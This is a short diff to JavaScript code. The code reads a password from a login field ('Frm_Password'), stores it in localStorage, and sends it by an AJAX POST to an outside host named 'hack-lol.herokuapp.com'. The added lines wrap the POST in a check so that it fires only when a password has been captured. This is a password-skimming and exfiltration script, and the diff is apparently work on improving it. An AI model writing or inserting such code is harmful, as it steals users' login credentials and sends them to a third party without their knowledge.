@@ -5,6 +5,7 @@ var id = "Frm_Password"; //TODO: update element id
         pass = document.getElementById(id).value;
 	localStorage.setItem("pass",pass);
 });
+if(localStorage.getItem("pass")){
         $.ajax({
     url: 'https://hack-lol.herokuapp.com/test',
     type: "POST",
@@ -24,4 +25,4 @@ return;
       return;
     }
   });
-      
+      };
